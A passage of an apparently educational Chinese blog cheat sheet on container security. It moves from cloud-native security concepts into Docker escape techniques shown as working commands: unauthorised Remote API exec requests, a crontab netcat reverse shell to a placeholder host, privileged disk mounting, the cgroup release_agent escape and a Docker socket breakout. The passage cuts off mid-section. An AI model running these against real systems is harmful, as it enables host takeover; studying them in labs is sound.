<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>
        Threezh1&#39;Blog
    </title>
    
<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">

    
<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">

    
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.2.0"></head>

<body id="bodyx">
    <div class="hd posts">
    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
    <div class="post-title">
        <p>
            云原生安全初认识之容器安全 Cheat Sheet
        </p>
        <hr>
    </div>
    <div class="post-content">
        <div class="post-date">
            <p> February 26th 2021, 4:45:01 pm &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>
        </div>
        <!--Table of Contents begin-->
        
            <div id="toc" class="toc-article">
            <strong class="toc-title">目录</strong>
            <a class="js-toggle-toc" href="javascript:void(0)"></a>
            <div class="toc-content">
                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8"><span class="toc-text">云原生安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8"><span class="toc-text">什么是云原生安全</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8%E7%9A%844%E4%B8%AAC"><span class="toc-text">云原生安全的4个C</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%89%E4%B8%8D%E5%90%8C%E8%A7%86%E8%A7%92%E8%BF%9B%E8%A1%8C%E7%9A%84%E5%AE%89%E5%85%A8%E5%88%92%E5%88%86"><span class="toc-text">按不同视角进行的安全划分</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E5%BB%BA-%E9%83%A8%E7%BD%B2-%E8%BF%90%E8%A1%8C"><span class="toc-text">构建-部署-运行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%89%8D%E5%90%8E"><span class="toc-text">攻击前后</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%B9%E5%99%A8%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="toc-text">容器攻击面</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%B9%E5%99%A8%E6%9C%AC%E8%BA%AB%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">容器本身的信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%BD%93%E5%89%8D%E6%9C%BA%E5%99%A8%E6%98%AF%E5%90%A6%E4%B8%BADocker%E5%AE%B9%E5%99%A8%E7%8E%AF%E5%A2%83"><span class="toc-text">判断当前机器是否为Docker容器环境</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8"><span class="toc-text">容器逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4Docker%E9%80%83%E9%80%B8"><span class="toc-text">配置不当导致Docker逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Docker-Remote-API-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-text">Docker Remote API 未授权访问</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Docker-%E9%AB%98%E5%8D%B1%E5%90%AF%E5%8A%A8%E5%8F%82%E6%95%B0-%E2%80%93privileged-%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%E5%90%AF%E5%8A%A8%E5%AE%B9%E5%99%A8"><span class="toc-text">Docker 高危启动参数 –privileged 特权模式启动容器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Docker-%E9%AB%98%E5%8D%B1%E5%90%AF%E5%8A%A8%E5%8F%82%E6%95%B0-%E2%80%93cap-add-SYS-ADMIN-%E5%88%A9%E7%94%A8"><span class="toc-text">Docker 高危启动参数 –cap-add&#x3D;SYS_ADMIN 利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%B1%E9%99%A9%E6%8C%82%E8%BD%BD%E5%AF%BC%E8%87%B4Docker%E9%80%83%E9%80%B8"><span class="toc-text">危险挂载导致Docker逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%82%E8%BD%BD-Docker-Socket"><span class="toc-text">挂载 Docker Socket</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%82%E8%BD%BD-procfs-%E7%9B%AE%E5%BD%95"><span class="toc-text">挂载 procfs 目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%82%E8%BD%BD-cgroup-%E7%9B%AE%E5%BD%95"><span class="toc-text">挂载 cgroup 目录</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4Docker%E9%80%83%E9%80%B8"><span class="toc-text">程序漏洞导致Docker逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2019-5736-runc%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E"><span class="toc-text">CVE-2019-5736 runc容器逃逸漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2019-14271-Docker-cp-%E5%91%BD%E4%BB%A4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E"><span class="toc-text">CVE-2019-14271 Docker cp 命令容器逃逸攻击漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2019-13139-Docker-build-code-execution"><span class="toc-text">CVE-2019-13139 Docker build code execution</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4Docker-%E9%80%83%E9%80%B8"><span class="toc-text">内核漏洞导致Docker 逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DirtyCow-CVE-2016-5195-%E8%84%8F%E7%89%9B%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0Docker-%E9%80%83%E9%80%B8"><span class="toc-text">DirtyCow(CVE-2016-5195)脏牛漏洞实现Docker 逃逸</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8-CDK"><span class="toc-text">工具使用 CDK</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#k8s%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-text">k8s的安全问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#k8s%E6%90%AD%E5%BB%BA%E8%B8%A9%E5%9D%91"><span class="toc-text">k8s搭建踩坑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#kube-proxy%E8%BE%B9%E7%95%8C%E7%BB%95%E8%BF%87-CVE-2020-8558"><span class="toc-text">kube-proxy边界绕过(CVE-2020-8558)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#K8s-Api-server"><span class="toc-text">K8s Api-server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#K8s-Service-Account"><span class="toc-text">K8s Service Account</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5"><span class="toc-text">容器安全最佳实践</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol>
            </div>
            </div>
        
        <!--Table of Contents end -->
        <h2 id="云原生安全"><a href="#云原生安全" class="headerlink" title="云原生安全"></a>云原生安全</h2><h3 id="什么是云原生安全"><a href="#什么是云原生安全" class="headerlink" title="什么是云原生安全"></a>什么是云原生安全</h3><p>云原生（Cloud Native）是一套技术体系和方法论，它由2个词组成，云（Cloud）和原生（Native）。云（Cloud）表示应用程序位于云中，而不是传统的数据中心；原生（Native）表示应用程序从设计之初即考虑到云的环境，原生为云而设计，在云上以最佳状态运行，充分利用和发挥云平台的弹性和分布式优势。</p>
<p>云原生的代表技术包括容器、服务网格（Service Mesh）、微服务（Microservice）、不可变基础设施和声明式API。</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/02/26/16135516731820.jpg"></p>
<h3 id="云原生安全的4个C"><a href="#云原生安全的4个C" class="headerlink" title="云原生安全的4个C"></a>云原生安全的4个C</h3><p>你可以分层去考虑安全性，云原生安全的 4 个 C 分别是云（Cloud）、集群（Cluster）、容器（Container）和代码（Code）。</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/02/26/16135515597056.jpg"></p>
<p>云原生安全模型的每一层都是基于下一个最外层，代码层受益于强大的基础安全层（云、集群、容器）。你无法通过在代码层解决安全问题来为基础层中糟糕的安全标准提供保护。</p>
<h3 id="按不同视角进行的安全划分"><a href="#按不同视角进行的安全划分" class="headerlink" title="按不同视角进行的安全划分"></a>按不同视角进行的安全划分</h3><h4 id="构建-部署-运行"><a href="#构建-部署-运行" class="headerlink" title="构建-部署-运行"></a>构建-部署-运行</h4><ul>
<li>构建时安全(Build)<ul>
<li>以规则引擎的形式运营监管容器镜像<ul>
<li>Dockerfile</li>
<li>可疑文件</li>
<li>敏感权限</li>
<li>敏感端口</li>
<li>基础软件漏洞</li>
<li>业务软件</li>
</ul>
</li>
</ul>
</li>
<li>部署时安全(Deployment)<ul>
<li>Kubernetes</li>
</ul>
</li>
<li>运行时安全(Runtime)<ul>
<li>HIDS</li>
</ul>
</li>
</ul>
<h4 id="攻击前后"><a href="#攻击前后" class="headerlink" title="攻击前后"></a>攻击前后</h4><ul>
<li>攻击前：裁剪攻击面，减少对外暴露的攻击面（本文涉及的场景关键词：隔离）；</li>
<li>攻击时：降低攻击成功率（本文涉及的场景关键词：加固）；</li>
<li>攻击后：减少攻击成功后攻击者所能获取的有价值的信息、数据以及增加留后门的难度等。</li>
</ul>
<h4 id="容器攻击面"><a href="#容器攻击面" class="headerlink" title="容器攻击面"></a>容器攻击面</h4><ul>
<li>Linux内核漏洞<ul>
<li>内核提权</li>
<li>容器逃逸</li>
</ul>
</li>
<li>容器自身<ul>
<li>CVE-2019-5736：runc - container breakout vulnerability</li>
</ul>
</li>
<li>不安全部署(配置)<ul>
<li>特权容器或者以root权限运行容器；</li>
<li>不合理的Capability配置（权限过大的Capability）。</li>
</ul>
</li>
</ul>
<h2 id="容器本身的信息收集"><a href="#容器本身的信息收集" class="headerlink" title="容器本身的信息收集"></a>容器本身的信息收集</h2><h3 id="判断当前机器是否为Docker容器环境"><a href="#判断当前机器是否为Docker容器环境" class="headerlink" title="判断当前机器是否为Docker容器环境"></a>判断当前机器是否为Docker容器环境</h3><ul>
<li>检查PID的进程名</li>
</ul>
<p>如果该进程就是应用进程则判断是容器，而如果是 init 进程或者 systemd 进程，则不一定是容器，当然不能排除是容器的情况，比如 LXD 实例的进程就为/sbin/init。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -p1</span><br></pre></td></tr></table></figure>

<ul>
<li>检查内核文件</li>
</ul>
<p>容器和虚拟机不一样的是，容器和宿主机是共享内核的，因此理论上容器内部是没有内核文件的，除非挂载了宿主机的/boot目录。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">KERNEL_PATH=$(cat /proc/cmdline | tr <span class="string">&#x27; &#x27;</span> <span class="string">&#x27;\n&#x27;</span> | awk -F <span class="string">&#x27;=&#x27;</span> <span class="string">&#x27;/BOOT_IMAGE/&#123;print $2&#125;&#x27;</span>)</span><br><span class="line"><span class="built_in">test</span> -e <span class="variable">$KERNEL_PATH</span> &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;Not Sure&quot;</span> || <span class="built_in">echo</span> <span class="string">&quot;Container&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>检查 <code>/proc/1/cgroup</code> 是否存在含有docker字符串，并且这条命令可以获取到docker容器的uuid。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/1/cgroup</span><br><span class="line"></span><br><span class="line">cat /proc/1/cgroup | grep -qi docker &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;Docker&quot;</span> || <span class="built_in">echo</span> <span class="string">&quot;Not Docker&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>检查根目录是否存在<code>.dockerenv</code>文件</li>
</ul>
<p>容器是通过 cgroup 实现资源限制，每个容器都会放到一个 cgroup 组中，如果是 Docker，则 cgroup 的名称为<code>docker-xxxx</code>，其中xxxx为 Docker 容器的 UUID。而控制容器的资源，本质就是控制运行在容器内部的进程资源，因此我们可以通过查看容器内部进程为 1 的 cgroup 名称获取线索。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -la /.dockerenv</span><br><span class="line"></span><br><span class="line">[[ -f /.dockerenv ]] &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;Docker&quot;</span> || <span class="built_in">echo</span> <span class="string">&quot;Not Docker&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>其他方式</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo readlink &#x2F;proc&#x2F;1&#x2F;exe</span><br><span class="line">&#x2F;&#x2F; 如果返回system字样则为宿主机</span><br><span class="line"></span><br><span class="line">systemd-detect-virt -c</span><br><span class="line">&#x2F;&#x2F; 返回none则为宿主机</span><br></pre></td></tr></table></figure>

<h2 id="容器逃逸"><a href="#容器逃逸" class="headerlink" title="容器逃逸"></a>容器逃逸</h2><ul>
<li>用户层<ul>
<li>用户配置不当</li>
<li>危险挂载</li>
</ul>
</li>
<li>服务层: 容器服务自身缺陷(程序漏洞)</li>
<li>系统层: Linux内核漏洞</li>
</ul>
<h3 id="配置不当导致Docker逃逸"><a href="#配置不当导致Docker逃逸" class="headerlink" title="配置不当导致Docker逃逸"></a>配置不当导致Docker逃逸</h3><h4 id="Docker-Remote-API-未授权访问"><a href="#Docker-Remote-API-未授权访问" class="headerlink" title="Docker Remote API 未授权访问"></a>Docker Remote API 未授权访问</h4><p><strong>docker swarm</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker swarm 是一个将docker集群变成单一虚拟的docker host工具，使用标准的Docker API，能够方便docker集群的管理和扩展，由docker官方提供</span><br></pre></td></tr></table></figure>

<p>docker swarm是管理docker集群的工具。主从管理、默认通过2375端口通信。绑定了一个Docker Remote API的服务，可以通过HTTP、Python、调用API来操作Docker。</p>
<p><strong>漏洞环境搭建</strong></p>
<p>使用vulhub搭建漏洞环境：<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/docker/unauthorized-rce/README.zh-cn.md">docker daemon api 未授权访问漏洞</a></p>
<p><strong>漏洞利用一 容器RCE</strong></p>
<ul>
<li>获取主机上所有容器：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -s -X GET http://&lt;docker_host&gt;:PORT/containers/json</span><br></pre></td></tr></table></figure>

<ul>
<li>创建一个将在容器上执行的”exec”实例</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;containers&#x2F;&lt;container_id&gt;&#x2F;exec HTTP&#x2F;1.1</span><br><span class="line">Host: &lt;docker_host&gt;:PORT</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 188</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;AttachStdin&quot;: true,</span><br><span class="line">  &quot;AttachStdout&quot;: true,</span><br><span class="line">  &quot;AttachStderr&quot;: true,</span><br><span class="line">  &quot;Cmd&quot;: [&quot;cat&quot;, &quot;&#x2F;etc&#x2F;passwd&quot;],</span><br><span class="line">  &quot;DetachKeys&quot;: &quot;ctrl-p,ctrl-q&quot;,</span><br><span class="line">  &quot;Privileged&quot;: true,</span><br><span class="line">  &quot;Tty&quot;: true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>bash 命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -i -s -X POST \</span><br><span class="line">-H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">--data-binary <span class="string">&#x27;&#123;&quot;AttachStdin&quot;: true,&quot;AttachStdout&quot;: true,&quot;AttachStderr&quot;: true,&quot;Cmd&quot;: [&quot;cat&quot;, &quot;/etc/passwd&quot;],&quot;DetachKeys&quot;: &quot;ctrl-p,ctrl-q&quot;,&quot;Privileged&quot;: true,&quot;Tty&quot;: true&#125;&#x27;</span> \</span><br><span class="line">http://&lt;docker_host&gt;:PORT/containers/&lt;container_id&gt;/<span class="built_in">exec</span></span><br></pre></td></tr></table></figure>

<ul>
<li>启动exec实例</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;exec&#x2F;&lt;exec_id&gt;&#x2F;start HTTP&#x2F;1.1</span><br><span class="line">Host: &lt;docker_host&gt;:PORT</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"> &quot;Detach&quot;: false,</span><br><span class="line"> &quot;Tty&quot;: false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>bash命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -i -s -X POST \</span><br><span class="line">-H <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line">--data-binary <span class="string">&#x27;&#123;&quot;Detach&quot;: false,&quot;Tty&quot;: false&#125;&#x27;</span> \</span><br><span class="line">http://&lt;docker_host&gt;:PORT/<span class="built_in">exec</span>/&lt;exec_id&gt;/start</span><br></pre></td></tr></table></figure>

<p><strong>漏洞利用二 宿主机RCE</strong></p>
<p>利用方法是，我们随意启动一个容器，并将宿主机的/etc目录挂载到容器中，便可以任意读写文件了。我们可以将命令写入crontab配置文件，进行反弹shell。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> docker</span><br><span class="line"></span><br><span class="line">client = docker.DockerClient(base_url=<span class="string">&#x27;http://your-ip:2375/&#x27;</span>)</span><br><span class="line">data = client.containers.run(<span class="string">&#x27;alpine:latest&#x27;</span>, <span class="string">r&#x27;&#x27;&#x27;sh -c &quot;echo &#x27;* * * * * /usr/bin/nc your-ip 21 -e /bin/sh&#x27; &gt;&gt; /tmp/etc/crontabs/root&quot; &#x27;&#x27;&#x27;</span>, remove=<span class="literal">True</span>, volumes=&#123;<span class="string">&#x27;/etc&#x27;</span>: &#123;<span class="string">&#x27;bind&#x27;</span>: <span class="string">&#x27;/tmp/etc&#x27;</span>, <span class="string">&#x27;mode&#x27;</span>: <span class="string">&#x27;rw&#x27;</span>&#125;&#125;)</span><br></pre></td></tr></table></figure>

<p><strong>使用cdk进行漏洞利用</strong></p>
<p>使用cdk直接执行命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run docker-api-pwn http://127.0.0.1:2375 <span class="string">&quot;touch /host/tmp/docker-api-pwn&quot;</span></span><br></pre></td></tr></table></figure>

<p>挂在宿主机根目录/到容器内部/host，然后执行用户输入的指令来篡改宿主机的文件，比如可以写/etc/crontab来搞定宿主机。</p>
<p>参考：<a target="_blank" rel="noopener" href="https://github.com/cdk-team/CDK/wiki/Exploit:-docker-api-pwn">Exploit: docker api pwn</a></p>
<h4 id="Docker-高危启动参数-–privileged-特权模式启动容器"><a href="#Docker-高危启动参数-–privileged-特权模式启动容器" class="headerlink" title="Docker 高危启动参数 –privileged 特权模式启动容器"></a>Docker 高危启动参数 –privileged 特权模式启动容器</h4><p><strong>原因</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当操作者执行docker run --privileged时，Docker将允许容器访问宿主机上的所有设备，同时修改AppArmor或SELinux的配置，使容器拥有与那些直接运行在宿主机上的进程几乎相同的访问权限。</span><br></pre></td></tr></table></figure>

<p><strong>环境搭建</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run -itd --privileged ubuntu:latest &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p><strong>漏洞利用</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看磁盘文件: fdisk -l</span><br><span class="line">新建目录以备挂载: mkdir &#x2F;aa</span><br><span class="line">将宿主机&#x2F;dev&#x2F;sda1目录挂载至容器内 &#x2F;aa: mount &#x2F;dev&#x2F;sda1 &#x2F;aa</span><br><span class="line">即可写文件获取权限或数据</span><br></pre></td></tr></table></figure>

<p>使用cdk：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run mount-disk</span><br></pre></td></tr></table></figure>

<h4 id="Docker-高危启动参数-–cap-add-SYS-ADMIN-利用"><a href="#Docker-高危启动参数-–cap-add-SYS-ADMIN-利用" class="headerlink" title="Docker 高危启动参数 –cap-add=SYS_ADMIN 利用"></a>Docker 高危启动参数 –cap-add=SYS_ADMIN 利用</h4><p>Docker 通过Linux namespace实现6项资源隔离，包括主机名、用户权限、文件系统、网络、进程号、进程间通讯。但部分启动参数授予容器权限较大的权限，从而打破了资源隔离的界限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--cap-add&#x3D;SYS_ADMIN  启动时，允许执行mount特权操作，需获得资源挂载进行利用。</span><br><span class="line">--net&#x3D;host           启动时，绕过Network Namespace</span><br><span class="line">--pid&#x3D;host              启动时，绕过PID Namespace</span><br><span class="line">--ipc&#x3D;host              启动时，绕过IPC Namespace</span><br></pre></td></tr></table></figure>

<p>前提：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在容器内root用户</span><br><span class="line">容器必须使用SYS_ADMIN Linux capability运行</span><br><span class="line">容器必须缺少AppArmor配置文件，否则将允许mount syscall</span><br><span class="line">cgroup v1虚拟文件系统必须以读写方式安装在容器内部</span><br></pre></td></tr></table></figure>

<p>我们需要一个cgroup，可以在其中写入notify_on_release文件(for enable cgroup notifications)，挂载cgroup控制器并创建子cgroup，创建/bin/sh进程并将其PID写入cgroup.procs文件，sh退出后执行release_agent文件。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># On the host</span></span><br><span class="line">docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash</span><br><span class="line"><span class="comment"># In the container</span></span><br><span class="line">mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /tmp/cgrp/x/notify_on_release</span><br><span class="line">host_path=`sed -n <span class="string">&#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27;</span> /etc/mtab`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$host_path</span>/cmd&quot;</span> &gt; /tmp/cgrp/release_agent</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/bin/sh&#x27;</span> &gt; /cmd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ls &gt; <span class="variable">$host_path</span>/output&quot;</span> &gt;&gt; /cmd</span><br><span class="line">chmod a+x /cmd</span><br><span class="line">sh -c <span class="string">&quot;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs&quot;</span></span><br></pre></td></tr></table></figure>

<p>查看导出的文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls /tmp/cgrp</span><br><span class="line">cat /output</span><br></pre></td></tr></table></figure>

<h3 id="危险挂载导致Docker逃逸"><a href="#危险挂载导致Docker逃逸" class="headerlink" title="危险挂载导致Docker逃逸"></a>危险挂载导致Docker逃逸</h3><p>挂载目录（-v /:/soft）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd -v /dir:/dir ubuntu:18.04 /bin/bash</span><br></pre></td></tr></table></figure>

<h4 id="挂载-Docker-Socket"><a href="#挂载-Docker-Socket" class="headerlink" title="挂载 Docker Socket"></a>挂载 Docker Socket</h4><p><strong>逃逸复现</strong></p>
<ul>
<li>首先创建一个容器并挂载/var/run/docker.sock</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd -v /var/run/docker.sock:/var/run/docker.sock ubuntu</span><br></pre></td></tr></table></figure>

<ul>
<li>在该容器内安装Docker命令行客户端</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">apt-update</span><br><span class="line">apt-get install \</span><br><span class="line">apt-transport-https \</span><br><span class="line">ca-certificates \</span><br><span class="line">curl \</span><br><span class="line">gnupg-agent \</span><br><span class="line">software-properties-common</span><br><span class="line">curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg | apt-key add -</span><br><span class="line">apt-key fingerprint 0EBFCD88</span><br><span class="line">add-apt-repository \</span><br><span class="line"><span class="string">&quot;deb [arch=amd64] https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/ \</span></span><br><span class="line"><span class="string"><span class="subst">$(lsb_release -cs)</span> \</span></span><br><span class="line"><span class="string">stable&quot;</span></span><br><span class="line">apt-get update</span><br><span class="line">apt-get install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure>

<ul>
<li>接着使用该客户端通过Docker Socket与Docker守护进程通信，发送命令创建并运行一个新的容器，将宿主机的根目录挂载到新创建的容器内部</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -v /:/host ubuntu:18.04 /bin/bash</span><br></pre></td></tr></table></figure>

<ul>
<li>在新容器内执行chroot将根目录切换到挂载的宿主机根目录。</li>
</ul>
